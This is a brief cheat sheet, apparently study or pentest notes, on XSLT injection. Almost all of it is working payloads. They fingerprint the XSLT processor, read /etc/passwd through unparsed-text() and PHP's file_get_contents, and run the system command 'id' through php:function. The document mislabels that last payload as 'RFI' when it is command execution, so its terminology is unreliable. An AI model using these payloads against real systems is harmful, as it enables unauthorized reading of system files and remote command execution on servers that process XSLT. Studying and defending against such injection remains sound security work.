# Identifying XSLT Injection

- using `<` as a payload
- infer some basic information about the XSLT processor

```xml
Version: <xsl:value-of select="system-property('xsl:version')" />
<br/>
Vendor: <xsl:value-of select="system-property('xsl:vendor')" />
<br/>
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" />
<br/>
Product Name: <xsl:value-of select="system-property('xsl:product-name')" />
<br/>
Product Version: <xsl:value-of select="system-property('xsl:product-version')" />
```

# Getting LFI using XSLT

```xml
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')" />
```

```xml
<xsl:value-of select="php:function('file_get_contents','/etc/passwd')" />
```

# Getting RFI using XSLT

- If an XSLT processor supports PHP functions

```xml
<xsl:value-of select="php:function('system','id')" />
```